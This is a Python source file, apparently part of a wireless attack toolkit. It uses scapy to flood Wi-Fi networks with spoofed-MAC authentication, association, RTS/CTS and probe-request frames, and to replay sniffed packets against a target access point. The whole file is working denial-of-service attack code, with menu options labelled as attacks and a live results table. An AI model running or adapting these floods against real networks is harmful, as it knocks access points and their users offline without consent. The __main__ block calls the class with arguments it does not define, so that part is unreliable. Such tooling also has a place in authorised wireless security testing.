# fuzzer.py
from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, Dot11ProbeReq, Dot11ProbeResp, Dot11AssoReq, Dot11Auth, Dot11, Dot11Deauth, RadioTap, Dot11AssoResp, Dot11Disas, Dot11QoS
import os
import time
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.text import Text
import queue

try:
    from FreewayTools.colors import cprint, iprint, wprint, cinput, ColorCodes

except ModuleNotFoundError:
    from colors import cprint, iprint, wprint, cinput, ColorCodes

def random_mac():
    mac = [random.randint(0x00, 0xff) for _ in range(6)]
    mac[0] = (mac[0] & 0xfe) | 0x02
    return ':'.join(map(lambda x: format(x, '02x'), mac))

def safe_send(*args, **kwargs):
    try:
        sendp(*args, **kwargs)
    except OSError:
        wprint("Network is down, but caught the error")
    except Exception as e:
        wprint(f"In safe_send in fuzzer.py, {e}")

class Sniffer:
    def __init__(self, interface, console, collector, debug=False, target=None, results=None):
        self.interface = interface
        self.collector = collector
        self.console = console
        self.debug = debug
        self.quant = 0
        self.target = target
        self.results = results
        self.authenticated_clients = 0

    def packet_handler(self, packet):
        if thread_event.is_set():
            return
        self.collector.put(packet)
        if self.debug:
            self.console.print(f"Current packet: {packet}", style="green")
        if self.target is not None:
            if packet.haslayer(Dot11Auth) and packet.addr2 == self.target and packet.addr1 != self.target:
                if self.debug:
                    self.console.print(f"Found! AP MAC: {packet.addr2} CLIENT: {packet.addr1}", style="red")
                    self.console.print(f"Adding to results!", style="red")
                
                client_mac = packet.addr1
                if client_mac not in self.results:
                    self.results[client_mac] = True
                    self.authenticated_clients += 1

    def run_sniff(self):
        while not thread_event.is_set():
            try:
                sniff(iface=self.interface, prn=self.packet_handler, store=0, monitor=True)
                time.sleep(1)
            except OSError as e:
                wprint(f"Network error: {e}")

class PacketConstructor:
    def __init__(self, parms, collector, ssid=None):
        self.parms = parms
        self.collector = collector
        self.ssid = ssid if ssid else 0

    def random_duration(self):
        return random.randint(0x0001, 0xFFFE)

    def construct_cts_frame(self, ap_mac):
        duration = self.random_duration()
        cts_frame = RadioTap() / Dot11(type=1, subtype=12, addr1=ap_mac, ID=duration)
        return cts_frame

    def construct_rts_frame(self, src_mac, dest_mac):
        duration = self.random_duration()
        rts_frame = RadioTap() / Dot11(type=1, subtype=11, addr1=dest_mac, addr2=src_mac, addr3=dest_mac, ID=duration)
        return rts_frame

    def construct_auth_frame(self, ap_mac, client_mac, algo=0, seq_num=1, status_code=0):
        auth_frame = RadioTap() / Dot11(type=0, subtype=11, addr1=ap_mac, addr2=client_mac, addr3=ap_mac) / Dot11Auth(algo=algo, seqnum=seq_num, status=status_code)
        return auth_frame

    def construct_asso_frame(self, ap_mac, client_mac):
        ssid = Dot11Elt(ID="SSID", info=self.ssid, len=len(str(self.ssid)))
        asso_frame = RadioTap() / Dot11(type=0, subtype=0, addr1=ap_mac, addr2=client_mac, addr3=ap_mac) / Dot11AssoReq(cap=0x1100, listen_interval=0x00a) / ssid
        return asso_frame

    def construct_probe_req_frame(self, src_mac):
        dot11 = Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff", addr2=src_mac, addr3=src_mac)
        probe_req = Dot11ProbeReq()
        ssid = Dot11Elt(ID="SSID", info=self.ssid, len=len(str(self.ssid)))
        probe_req_frame = RadioTap() / dot11 / probe_req / ssid
        return probe_req_frame

thread_event = threading.Event()

class Fuzzer:
    def __init__(self, interface, parms):
        self.interface = interface  
        self.parms = parms
        self.console = Console()
        self.collector = queue.Queue()
        self.target = cinput("Enter target MAC") if any(x in self.parms for x in ["3", "4", "m"]) else None
        self.total_packets_sent = 0
        self.results = {}
        self.ssid = cinput("Enter target ESSID") if any(x in self.parms for x in ["4", "5", "s"]) else 0
        self.debug = True if "v" in self.parms else False
        self.sniffer = Sniffer(interface=self.interface, console=self.console, collector=self.collector, debug=self.debug, target=self.target, results=self.results)
        self.packet_constructor = PacketConstructor(parms, self.collector, self.ssid)
        self.threads = int(cinput("Enter thread count")) if "t" in self.parms else 1

    def init_monitor_mode(self, mode="monitor"):
        try:
            for interface in self.interface:
                os.system(f'sudo iwconfig {interface} mode {mode}')
        except Exception as e:
            wprint(f"Error while putting interface in monitor mode: {e}")

    def run_fuzzing(self):
        try:
            thread_event.clear()
            self.init_monitor_mode()
            if "1" in self.parms:
                iprint("Starting the Packet Reply attack!")
                threading.Thread(target=self.sniffer.run_sniff, daemon=True).start()
                for i in range(0, self.threads):
                    for interface in self.interface:
                        threading.Thread(target=self.packet_reply, args=(interface,), daemon=True).start()
                while not thread_event.is_set():
                    pass
            elif "2" in self.parms:
                iprint("Starting the RTS/CTS DoS attack!")
                for i in range(0, self.threads):
                    for interface in self.interface:
                        threading.Thread(target=self.rts_spam, args=(interface,), daemon=True).start()
                        threading.Thread(target=self.cts_spam, args=(interface,), daemon=True).start()
                while not thread_event.is_set():
                    pass
            elif "3" in self.parms:
                iprint("Starting the Authentication DoS attack!")
                for i in range(0, self.threads):
                    threading.Thread(target=self.sniffer.run_sniff, daemon=True).start()
                    for interface in self.interface:
                        threading.Thread(target=self.auth_spam, args=(self.target, interface), daemon=True).start()
                with Live(generate_table(self.target, self.sniffer.authenticated_clients, self.total_packets_sent), refresh_per_second=1, console=self.console) as live:
                    while not thread_event.is_set():
                        if self.debug:
                            self.console.print(f"", style="white")
                        live.update(generate_table(self.target, self.sniffer.authenticated_clients, self.total_packets_sent))
                        time.sleep(1)

            elif "4" in self.parms:
                iprint("Starting the Association DoS attack!")
                for i in range(0, self.threads):
                    threading.Thread(target=self.sniffer.run_sniff, daemon=True).start()
                    for interface in self.interface:
                        threading.Thread(target=self.asso_spam, args=(self.target, interface), daemon=True).start()
                
                with Live(generate_table(self.target, self.sniffer.authenticated_clients, self.total_packets_sent), refresh_per_second=1, console=self.console) as live:
                    while not thread_event.is_set():
                        if self.debug:
                            self.console.print(f"", style="white")
                        live.update(generate_table(self.target, self.sniffer.authenticated_clients, self.total_packets_sent))
                        time.sleep(1)

            elif "5" in self.parms:
                iprint("Starting PR spam!")
                for thread in range(0, self.threads):
                    for interface in self.interface:
                        threading.Thread(target=self.probe_spam, args=(interface,), daemon=True).start()
                while not thread_event.is_set():
                    pass
                    
        except KeyboardInterrupt:
            thread_event.set()
            time.sleep(1)  
            self.init_monitor_mode(mode="managed")          

    def probe_spam(self, interface):
        while not thread_event.is_set():
            rmac = random_mac()
            probe_frame = self.packet_constructor.construct_probe_req_frame(rmac)
            safe_send(probe_frame, iface=interface, count=1, verbose=False)
            if self.debug:
                self.console.print(f"Probe Request sent for {rmac}, ssid {self.ssid}", style="green")

    def asso_spam(self, target, interface):
        while not thread_event.is_set():
            client_mac = random_mac()
            asso_frame = self.packet_constructor.construct_asso_frame(target, client_mac)
            safe_send(asso_frame, iface=interface, count=1, verbose=False)
            self.total_packets_sent += 1

    def auth_spam(self, target, interface):
        while not thread_event.is_set():
            client_mac = random_mac()
            auth_frame = self.packet_constructor.construct_auth_frame(target, client_mac)
            safe_send(auth_frame, iface=interface, count=1, verbose=False)
            self.total_packets_sent += 1

    def cts_spam(self, interface):
        while not thread_event.is_set():
            rmac = random_mac()
            cts_frame = self.packet_constructor.construct_cts_frame(rmac)
            safe_send(cts_frame, iface=interface, count=1, verbose=False)
            if self.debug:
                self.console.print(f"CTS frame sent to AP MAC: {rmac} THE CTS: {cts_frame}", style="blue")

    def rts_spam(self, interface):
        src_mac = random_mac()
        while not thread_event.is_set():
            dest_mac = random_mac()
            rts_frame = self.packet_constructor.construct_rts_frame(src_mac, dest_mac)
            safe_send(rts_frame, iface=interface, count=1, verbose=False)
            if self.debug:
                self.console.print(f"RTS frame sent from {src_mac} to {dest_mac}: {rts_frame}", style="blue")

    def packet_reply(self, interface):
        while not thread_event.is_set():
            # self.console.print(f"Collector is empty!", style="yellow")
            if not self.collector.empty():
                packet = self.collector.get()
                safe_send(packet, iface=interface, count=1, verbose=False)
                self.console.print(f"Packet sent! Packet: {packet}", style="blue")

def generate_table(target, authenticated_clients, total_packets_sent):
    table = Table(title=Text("Attack Results", style="bold white"), border_style="white")
    table.add_column(Text("Target AP", style="magenta"))
    table.add_column(Text("Authenticated Clients", style="green"))
    table.add_column(Text("Total Packets Sent", justify="right", style="yellow"))
    
    target_text = Text(str(target), style="magenta")
    auth_clients_text = Text(str(authenticated_clients), style="green")
    packets_sent_text = Text(str(total_packets_sent), style="yellow")

    table.add_row(target_text, auth_clients_text, packets_sent_text)

    return table

if __name__ == "__main__":
    fuzzer = Fuzzer(interface="wlan1", parms={"5": None}, target="70:4f:57:dd:af:40", ssid="RANCZO1")
    fuzzer.run_fuzzing()